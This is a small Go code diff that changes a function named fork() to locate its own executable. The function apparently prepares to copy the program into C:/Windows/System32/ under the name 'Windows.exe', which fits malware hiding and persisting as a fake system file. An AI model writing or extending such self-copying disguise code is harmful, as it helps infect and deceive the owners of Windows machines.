@@ -324,7 +324,7 @@ func getMac() string {
 }
 
 func fork() {
-	src, _ := os.Getwd()
+	src, _ := filepath.Abs(filepath.Dir(os.Args[0]))
 	dst := "C:/Windows/System32/"
 	dstFileName := "Windows.exe"
 	fmt.Println(src)
